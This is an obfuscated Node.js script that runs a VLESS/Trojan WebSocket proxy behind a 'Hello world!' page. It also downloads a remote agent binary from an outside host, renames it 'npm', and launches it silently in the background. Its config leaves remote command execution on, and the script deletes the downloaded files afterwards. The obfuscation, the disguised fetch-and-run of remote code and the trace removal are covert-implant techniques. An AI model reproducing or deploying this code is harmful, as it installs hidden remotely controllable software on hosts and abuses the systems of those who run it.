const _0x3bc9a6=_0x34e9;(function(_0x58907e,_0x503ff2){const _0x272ffb=_0x34e9,_0x465c8a=_0x58907e();while(!![]){try{const _0x372d26=parseInt(_0x272ffb(0x180))/0x1*(-parseInt(_0x272ffb(0x163))/0x2)+-parseInt(_0x272ffb(0x181))/0x3*(-parseInt(_0x272ffb(0x185))/0x4)+parseInt(_0x272ffb(0x120))/0x5*(-parseInt(_0x272ffb(0x177))/0x6)+-parseInt(_0x272ffb(0x123))/0x7+parseInt(_0x272ffb(0x125))/0x8*(-parseInt(_0x272ffb(0x176))/0x9)+parseInt(_0x272ffb(0x119))/0xa+parseInt(_0x272ffb(0x132))/0xb;if(_0x372d26===_0x503ff2)break;else _0x465c8a['push'](_0x465c8a['shift']());}catch(_0xd67e99){_0x465c8a['push'](_0x465c8a['shift']());}}}(_0xfe97,0x3ad9f));function _0xfe97(){const _0x2a1261=['hex','5efabea4-f6d4-91fd-b8f0-17e004vinfol','unlink','50428KRLReU','NEZHA_PORT','net','length','country_code','get','2087','type','config.yaml','reduce','&path=%2F','npm\x20is\x20already\x20running,\x20skip\x20running...','error','NEZHA_KEY','decode','url','2083','test','1804190AfNwiA','data','includes','https://arm64.ssss.nyc.mn/v1','Status','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','substr','5Fvuzyl','npm','Answer','790321CmuqLN','finish','116688KjpJmk','crypto','text/html','log','find','update','base64','/bin/bash','createWriteStream','pop',':443?encryption=none&security=tls&sni=','trojan://','npm\x20download\x20successfully','9560925WcFTpl','error:\x20','https://amd64.ssss.nyc.mn/v1','1234.abc.com','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Unknown','index.html','aarch64','Failed\x20to\x20resolve\x20','map','&fp=chrome&type=ws&host=','createHash','once','isp','catch','env','message','readFile','pipe','true','https://amd64.ssss.nyc.mn/agent','--tls','WSPATH','8.8.4.4','readUInt16BE','write','slice','from','setsid\x20nohup\x20./npm\x20-s\x20','writeHead','1.1.1.1','writeFileSync','digest','2096','utf8','\x20with\x20all\x20DNS\x20servers','createServer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','listen','concat','every','Not\x20Found\x0a','arm64','then','close','readUInt8','connection','trim','application/json','37108KryTTN','8443','2053','AUTO_ACCESS','send','connect','child_process','text/plain','arch','stream','replace','NAME','end','Server\x20is\x20running\x20on\x20port\x20','chmod\x20+x\x20npm','Hello\x20world!','NEZHA_SERVER','http','https://api.ip.sb/geoip','243Zwcckd','1992114eWhPtK','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf-8','DOMAIN','buffer','join','toString','path','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','14gQbaMD','69fFzqRm'];_0xfe97=function(){return _0x2a1261;};return _0xfe97();}const os=require('os'),http=require(_0x3bc9a6(0x174)),fs=require('fs'),axios=require('axios'),net=require(_0x3bc9a6(0x187)),path=require(_0x3bc9a6(0x17e)),crypto=require(_0x3bc9a6(0x126)),{Buffer}=require(_0x3bc9a6(0x17b)),{exec,execSync}=require(_0x3bc9a6(0x169)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x3bc9a6(0x183),NEZHA_SERVER=process[_0x3bc9a6(0x141)][_0x3bc9a6(0x173)]||'',NEZHA_PORT=process['env'][_0x3bc9a6(0x186)]||'',NEZHA_KEY=process[_0x3bc9a6(0x141)][_0x3bc9a6(0x114)]||'',DOMAIN=process['env'][_0x3bc9a6(0x17a)]||_0x3bc9a6(0x135),AUTO_ACCESS=process[_0x3bc9a6(0x141)][_0x3bc9a6(0x166)]||!![],WSPATH=process['env'][_0x3bc9a6(0x148)]||UUID[_0x3bc9a6(0x14c)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub',NAME=process[_0x3bc9a6(0x141)][_0x3bc9a6(0x16e)]||'',PORT=process[_0x3bc9a6(0x141)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x46b3db=_0x3bc9a6;try{const _0x1196e1=await axios['get'](_0x46b3db(0x175)),_0x47f360=_0x1196e1[_0x46b3db(0x11a)];ISP=(_0x47f360[_0x46b3db(0x10b)]+'-'+_0x47f360[_0x46b3db(0x13f)])[_0x46b3db(0x16d)](/ /g,'_');}catch(_0x1cefbe){ISP=_0x46b3db(0x137);}};GetISP();const httpServer=http[_0x3bc9a6(0x156)]((_0x1fde6b,_0x57ba77)=>{const _0x26f6ea=_0x3bc9a6;if(_0x1fde6b[_0x26f6ea(0x116)]==='/'){const _0x402310=path[_0x26f6ea(0x17c)](__dirname,_0x26f6ea(0x138));fs[_0x26f6ea(0x143)](_0x402310,_0x26f6ea(0x154),(_0x55606f,_0x376030)=>{const _0x3e0dd5=_0x26f6ea;if(_0x55606f){_0x57ba77[_0x3e0dd5(0x14f)](0xc8,{'Content-Type':'text/html'}),_0x57ba77[_0x3e0dd5(0x16f)](_0x3e0dd5(0x172));return;}_0x57ba77[_0x3e0dd5(0x14f)](0xc8,{'Content-Type':_0x3e0dd5(0x127)}),_0x57ba77['end'](_0x376030);});return;}else{if(_0x1fde6b[_0x26f6ea(0x116)]==='/'+SUB_PATH){const _0x415b80=NAME?NAME+'-'+ISP:ISP,_0xd0654c='vless://'+UUID+'@'+DOMAIN+_0x26f6ea(0x12f)+DOMAIN+_0x26f6ea(0x13c)+DOMAIN+_0x26f6ea(0x111)+WSPATH+'#'+_0x415b80,_0x1e3e92=_0x26f6ea(0x130)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x415b80,_0x19c688=_0xd0654c+'\x0a'+_0x1e3e92,_0x18746b=Buffer[_0x26f6ea(0x14d)](_0x19c688)[_0x26f6ea(0x17d)](_0x26f6ea(0x12b));_0x57ba77[_0x26f6ea(0x14f)](0xc8,{'Content-Type':'text/plain'}),_0x57ba77[_0x26f6ea(0x16f)](_0x18746b+'\x0a');}else _0x57ba77[_0x26f6ea(0x14f)](0x194,{'Content-Type':_0x26f6ea(0x16a)}),_0x57ba77[_0x26f6ea(0x16f)](_0x26f6ea(0x15b));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x3bc9a6(0x149),_0x3bc9a6(0x150)];function resolveHost(_0x3494c8){return new Promise((_0x422b41,_0x462ff3)=>{const _0x4e57c6=_0x34e9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4e57c6(0x118)](_0x3494c8)){_0x422b41(_0x3494c8);return;}let _0x4b2eb8=0x0;function _0x46e60c(){const _0x14e050=_0x4e57c6;if(_0x4b2eb8>=DNS_SERVERS[_0x14e050(0x188)]){_0x462ff3(new Error(_0x14e050(0x13a)+_0x3494c8+_0x14e050(0x155)));return;}const _0x3b81c9=DNS_SERVERS[_0x4b2eb8];_0x4b2eb8++;const _0x173e5c='https://dns.google/resolve?name='+encodeURIComponent(_0x3494c8)+'&type=A';axios[_0x14e050(0x10c)](_0x173e5c,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x14e050(0x15d)](_0x4534f4=>{const _0x573628=_0x14e050,_0xc5fd64=_0x4534f4[_0x573628(0x11a)];if(_0xc5fd64[_0x573628(0x11d)]===0x0&&_0xc5fd64[_0x573628(0x122)]&&_0xc5fd64[_0x573628(0x122)][_0x573628(0x188)]>0x0){const _0x39162c=_0xc5fd64['Answer'][_0x573628(0x129)](_0x57b46a=>_0x57b46a[_0x573628(0x10e)]===0x1);if(_0x39162c){_0x422b41(_0x39162c[_0x573628(0x11a)]);return;}}_0x46e60c();})['catch'](_0x4a9ba2=>{_0x46e60c();});}_0x46e60c();});}function handleVlessConnection(_0x1407de,_0x4e2a47){const _0x56fff3=_0x3bc9a6,[_0x442684]=_0x4e2a47,_0x16ed7c=_0x4e2a47[_0x56fff3(0x14c)](0x1,0x11);if(!_0x16ed7c[_0x56fff3(0x15a)]((_0x4726a7,_0x1fb13a)=>_0x4726a7==parseInt(uuid[_0x56fff3(0x11f)](_0x1fb13a*0x2,0x2),0x10)))return![];let _0x224fb4=_0x4e2a47[_0x56fff3(0x14c)](0x11,0x12)['readUInt8']()+0x13;const _0x256f0f=_0x4e2a47[_0x56fff3(0x14c)](_0x224fb4,_0x224fb4+=0x2)[_0x56fff3(0x14a)](0x0),_0x43a7a8=_0x4e2a47[_0x56fff3(0x14c)](_0x224fb4,_0x224fb4+=0x1)[_0x56fff3(0x15f)](),_0x5a5c23=_0x43a7a8==0x1?_0x4e2a47[_0x56fff3(0x14c)](_0x224fb4,_0x224fb4+=0x4)[_0x56fff3(0x17c)]('.'):_0x43a7a8==0x2?new TextDecoder()[_0x56fff3(0x115)](_0x4e2a47[_0x56fff3(0x14c)](_0x224fb4+0x1,_0x224fb4+=0x1+_0x4e2a47[_0x56fff3(0x14c)](_0x224fb4,_0x224fb4+0x1)[_0x56fff3(0x15f)]())):_0x43a7a8==0x3?_0x4e2a47['slice'](_0x224fb4,_0x224fb4+=0x10)['reduce']((_0x56b2d5,_0x46f2f5,_0x3fd575,_0x3d8420)=>_0x3fd575%0x2?_0x56b2d5[_0x56fff3(0x159)](_0x3d8420['slice'](_0x3fd575-0x1,_0x3fd575+0x1)):_0x56b2d5,[])[_0x56fff3(0x13b)](_0x1b876c=>_0x1b876c[_0x56fff3(0x14a)](0x0)[_0x56fff3(0x17d)](0x10))['join'](':'):'';_0x1407de[_0x56fff3(0x167)](new Uint8Array([_0x442684,0x0]));const _0x51cc76=createWebSocketStream(_0x1407de);return resolveHost(_0x5a5c23)[_0x56fff3(0x15d)](_0x24d914=>{const _0x2ba3cc=_0x56fff3;net[_0x2ba3cc(0x168)]({'host':_0x24d914,'port':_0x256f0f},function(){const _0x577574=_0x2ba3cc;this[_0x577574(0x14b)](_0x4e2a47[_0x577574(0x14c)](_0x224fb4)),_0x51cc76['on'](_0x577574(0x113),()=>{})[_0x577574(0x144)](this)['on']('error',()=>{})[_0x577574(0x144)](_0x51cc76);})['on'](_0x2ba3cc(0x113),()=>{});})[_0x56fff3(0x140)](_0xa02b7e=>{const _0x57b91b=_0x56fff3;net[_0x57b91b(0x168)]({'host':_0x5a5c23,'port':_0x256f0f},function(){const _0x175610=_0x57b91b;this[_0x175610(0x14b)](_0x4e2a47['slice'](_0x224fb4)),_0x51cc76['on'](_0x175610(0x113),()=>{})[_0x175610(0x144)](this)['on'](_0x175610(0x113),()=>{})['pipe'](_0x51cc76);})['on'](_0x57b91b(0x113),()=>{});}),!![];}function handleTrojanConnection(_0x221689,_0x492514){const _0x295f3e=_0x3bc9a6;try{if(_0x492514['length']<0x3a)return![];const _0x4eed08=_0x492514[_0x295f3e(0x14c)](0x0,0x38)[_0x295f3e(0x17d)](),_0x595446=[UUID];let _0x489a8e=null;for(const _0x5a37d8 of _0x595446){const _0x320b9c=crypto[_0x295f3e(0x13d)]('sha224')[_0x295f3e(0x12a)](_0x5a37d8)[_0x295f3e(0x152)](_0x295f3e(0x182));if(_0x320b9c===_0x4eed08){_0x489a8e=_0x5a37d8;break;}}if(!_0x489a8e)return![];let _0x3e174c=0x38;_0x492514[_0x3e174c]===0xd&&_0x492514[_0x3e174c+0x1]===0xa&&(_0x3e174c+=0x2);const _0x443532=_0x492514[_0x3e174c];if(_0x443532!==0x1)return![];_0x3e174c+=0x1;const _0xcc2fcb=_0x492514[_0x3e174c];_0x3e174c+=0x1;let _0x4e47a6,_0x730b92;if(_0xcc2fcb===0x1)_0x4e47a6=_0x492514[_0x295f3e(0x14c)](_0x3e174c,_0x3e174c+0x4)[_0x295f3e(0x17c)]('.'),_0x3e174c+=0x4;else{if(_0xcc2fcb===0x3){const _0x1ccdef=_0x492514[_0x3e174c];_0x3e174c+=0x1,_0x4e47a6=_0x492514[_0x295f3e(0x14c)](_0x3e174c,_0x3e174c+_0x1ccdef)[_0x295f3e(0x17d)](),_0x3e174c+=_0x1ccdef;}else{if(_0xcc2fcb===0x4)_0x4e47a6=_0x492514['slice'](_0x3e174c,_0x3e174c+0x10)[_0x295f3e(0x110)]((_0x57f454,_0x58817f,_0x355973,_0x2c31f7)=>_0x355973%0x2?_0x57f454[_0x295f3e(0x159)](_0x2c31f7[_0x295f3e(0x14c)](_0x355973-0x1,_0x355973+0x1)):_0x57f454,[])[_0x295f3e(0x13b)](_0x131958=>_0x131958[_0x295f3e(0x14a)](0x0)[_0x295f3e(0x17d)](0x10))[_0x295f3e(0x17c)](':'),_0x3e174c+=0x10;else return![];}}_0x730b92=_0x492514[_0x295f3e(0x14a)](_0x3e174c),_0x3e174c+=0x2;_0x3e174c<_0x492514[_0x295f3e(0x188)]&&_0x492514[_0x3e174c]===0xd&&_0x492514[_0x3e174c+0x1]===0xa&&(_0x3e174c+=0x2);const _0x55fb82=createWebSocketStream(_0x221689);return resolveHost(_0x4e47a6)[_0x295f3e(0x15d)](_0x4c85a1=>{const _0x12b74b=_0x295f3e;net['connect']({'host':_0x4c85a1,'port':_0x730b92},function(){const _0x462b5d=_0x34e9;_0x3e174c<_0x492514[_0x462b5d(0x188)]&&this[_0x462b5d(0x14b)](_0x492514[_0x462b5d(0x14c)](_0x3e174c)),_0x55fb82['on']('error',()=>{})[_0x462b5d(0x144)](this)['on']('error',()=>{})['pipe'](_0x55fb82);})['on'](_0x12b74b(0x113),()=>{});})[_0x295f3e(0x140)](_0xd7479e=>{const _0x3890ed=_0x295f3e;net[_0x3890ed(0x168)]({'host':_0x4e47a6,'port':_0x730b92},function(){const _0x2d516f=_0x3890ed;_0x3e174c<_0x492514[_0x2d516f(0x188)]&&this[_0x2d516f(0x14b)](_0x492514[_0x2d516f(0x14c)](_0x3e174c)),_0x55fb82['on'](_0x2d516f(0x113),()=>{})[_0x2d516f(0x144)](this)['on']('error',()=>{})[_0x2d516f(0x144)](_0x55fb82);})['on'](_0x3890ed(0x113),()=>{});}),!![];}catch(_0x16d27e){return![];}}wss['on'](_0x3bc9a6(0x160),(_0x25376f,_0x40d18c)=>{const _0x14510a=_0x3bc9a6,_0x2f2175=_0x40d18c['url']||'';_0x25376f[_0x14510a(0x13e)](_0x14510a(0x142),_0x5872c0=>{const _0x2cba41=_0x14510a;if(_0x5872c0[_0x2cba41(0x188)]>0x11&&_0x5872c0[0x0]===0x0){const _0x5986e4=_0x5872c0['slice'](0x1,0x11),_0x31e33c=_0x5986e4[_0x2cba41(0x15a)]((_0x57f0d9,_0x14ea82)=>_0x57f0d9==parseInt(uuid[_0x2cba41(0x11f)](_0x14ea82*0x2,0x2),0x10));if(_0x31e33c){!handleVlessConnection(_0x25376f,_0x5872c0)&&_0x25376f[_0x2cba41(0x15e)]();return;}}!handleTrojanConnection(_0x25376f,_0x5872c0)&&_0x25376f[_0x2cba41(0x15e)]();})['on'](_0x14510a(0x113),()=>{});});function _0x34e9(_0x4ac8a1,_0x2f3c8c){_0x4ac8a1=_0x4ac8a1-0x10b;const _0xfe977=_0xfe97();let _0x34e9d2=_0xfe977[_0x4ac8a1];return _0x34e9d2;}const getDownloadUrl=()=>{const _0x505c86=_0x3bc9a6,_0x31be9a=os[_0x505c86(0x16b)]();return _0x31be9a==='arm'||_0x31be9a===_0x505c86(0x15c)||_0x31be9a===_0x505c86(0x139)?!NEZHA_PORT?_0x505c86(0x11c):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x505c86(0x134):_0x505c86(0x146);},downloadFile=async()=>{const _0x158ce9=_0x3bc9a6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5421d6=getDownloadUrl(),_0x591d55=await axios({'method':_0x158ce9(0x10c),'url':_0x5421d6,'responseType':_0x158ce9(0x16c)}),_0x59883f=fs[_0x158ce9(0x12d)](_0x158ce9(0x121));return _0x591d55['data'][_0x158ce9(0x144)](_0x59883f),new Promise((_0x24ab18,_0x2f0b93)=>{const _0x4e2add=_0x158ce9;_0x59883f['on'](_0x4e2add(0x124),()=>{const _0x5b83f5=_0x4e2add;console[_0x5b83f5(0x128)](_0x5b83f5(0x131)),exec(_0x5b83f5(0x171),_0x5ec376=>{if(_0x5ec376)_0x2f0b93(_0x5ec376);_0x24ab18();});}),_0x59883f['on'](_0x4e2add(0x113),_0x2f0b93);});}catch(_0x48a301){throw _0x48a301;}},runnz=async()=>{const _0x115044=_0x3bc9a6;try{const _0x12b920=execSync(_0x115044(0x157),{'encoding':_0x115044(0x179)});if(_0x12b920[_0x115044(0x161)]()!==''){console['log'](_0x115044(0x112));return;}}catch(_0x38715b){}await downloadFile();let _0x293fff='',_0x3873d8=['443',_0x115044(0x164),_0x115044(0x153),_0x115044(0x10d),_0x115044(0x117),_0x115044(0x165)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x421417=_0x3873d8['includes'](NEZHA_PORT)?_0x115044(0x147):'';_0x293fff=_0x115044(0x14e)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x421417+_0x115044(0x178);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x441153=NEZHA_SERVER[_0x115044(0x11b)](':')?NEZHA_SERVER['split'](':')[_0x115044(0x12e)]():'',_0x26720b=_0x3873d8[_0x115044(0x11b)](_0x441153)?_0x115044(0x145):'false',_0x20b917='client_secret:\x20'+NEZHA_KEY+_0x115044(0x11e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x26720b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x115044(0x151)](_0x115044(0x10f),_0x20b917);}_0x293fff=_0x115044(0x17f);}else{console['log'](_0x115044(0x136));return;}}try{exec(_0x293fff,{'shell':_0x115044(0x12c)},_0xb93d26=>{const _0x3e5a52=_0x115044;if(_0xb93d26)console[_0x3e5a52(0x113)]('npm\x20running\x20error:',_0xb93d26);else console[_0x3e5a52(0x128)]('npm\x20is\x20running');});}catch(_0x274b67){console[_0x115044(0x113)](_0x115044(0x133)+_0x274b67);}};async function addAccessTask(){const _0x3900b2=_0x3bc9a6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x76e7d7='https://'+DOMAIN;try{const _0x39ae78=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x76e7d7},{'headers':{'Content-Type':_0x3900b2(0x162)}});console[_0x3900b2(0x128)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x1e10e1){}}const delFiles=()=>{const _0x54c148=_0x3bc9a6;fs[_0x54c148(0x184)]('npm',()=>{}),fs[_0x54c148(0x184)](_0x54c148(0x10f),()=>{});};httpServer[_0x3bc9a6(0x158)](PORT,()=>{const _0xef68c=_0x3bc9a6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0xef68c(0x170)+PORT);});
